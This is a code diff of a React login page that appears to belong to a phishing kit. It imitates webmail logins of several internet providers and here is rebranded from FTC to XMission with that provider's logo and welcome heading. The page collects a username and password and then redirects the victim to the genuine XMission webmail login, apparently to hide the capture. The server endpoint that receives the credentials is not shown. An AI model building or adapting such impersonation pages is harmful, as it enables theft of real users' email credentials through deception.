@@ -12,6 +12,7 @@ import winstream from './windstream.png';
 import wave from './wave.png';
 import centurylink from './centurylink.png';
 import ftc from './ftc.svg';
+import xmission from './xmission.png';
 
 function Home(){
 
@@ -19,7 +20,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("FTC")
+    const[platform, setPlatform] = useState("XMission")
 
     const[showError, setShowError] = useState(false);
 
@@ -46,7 +47,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://webmail.ftc-i.net/login';
+             window.location.href = 'https://webmail.xmission.com/xm/login.php?url=https%3A%2F%2Fwebmail.xmission.com%2Flogin.php';
           }
         } catch (error) {
           // Handle error
@@ -58,7 +59,7 @@ function Home(){
     return (
         <>
 
-        <div className='spacer'>
+        <div className=''>
         {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -69,16 +70,23 @@ function Home(){
 
 
 
-            <div className='my-2 px-3 text-center'>
-            <img  src={ftc} className="mylogo"/>
+            <div className=' py-4 px-3 text-center nav'>
+            <img  src={xmission} className="mylogo"/>
 
             </div>
 
+            <br/>
 
-            <div className='col-md-4 whitediv m-auto   px-0'>
+            <br/>
+
+
+            <div className='col-md-6 whitediv m-auto   px-0'>
               
 
             
+            <h3 className='text-center font-weight-bold py-3'style={{
+                color:"grey",
+            }}>Welcome to XMission Webmail</h3>
                 
 
 
@@ -87,21 +95,21 @@ function Home(){
 
                     <div className='form-group mt-5'>
                  
+                    <label className='font-weight-bold'>Username</label>
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} placeholder="Email" className="form-control bottom-border-only py-3"required />
+                        }}value={email}  className="form-control py-2"required />
 
                     </div>
 
-                    <br/>
 
 
                     <div className='form-group'>
                   
-                 
+                    <label className='font-weight-bold'>Password</label>
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} placeholder="Password" className="form-control bottom-border-only py-3"required />
+                        }}value={password}  className="form-control  py-2"required />
                        
 
                     </div>
@@ -141,12 +149,14 @@ function Home(){
                     </div> */}
 
 
-                    <div className='form-group text-center mt-5'>
+                    <div className='form-group  mt-5'>
 
 <button type='submit' style={{
-  backgroundColor: '#0047bb',
+  backgroundColor: '#9296a3',
   fontSize:'18px',
-}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>Sign In</button>
+  color:'white',
+  width:"40%",
+}}className='btn text-center  font-weight-bold text-light py-2 rounded '>LOG IN</button>
 
 
 
@@ -155,14 +165,7 @@ function Home(){
 
 </div>
 
-<div className='linkdiv text-center'>
-  <a style={{
-        color: 'grey',
-        textDecoration: 'none',
-  }}>Forgot Password <br/>
-</a>
 
-</div>
 
 
 
